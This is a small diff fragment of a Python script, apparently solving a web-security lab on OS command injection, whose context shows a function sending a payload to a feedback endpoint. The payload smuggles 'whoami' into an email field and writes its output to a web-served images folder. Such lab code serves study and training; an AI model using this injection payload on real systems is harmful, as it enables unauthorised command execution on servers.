@@ -40,6 +40,7 @@ def get_content(s, url):
         exit(1)
 
 
+
 def os_command_injection(s, url):
     stock_path = "/feedback/submit"
     command_injection = "1337@1337.org & whoami > /var/www/images/whoami.txt #"
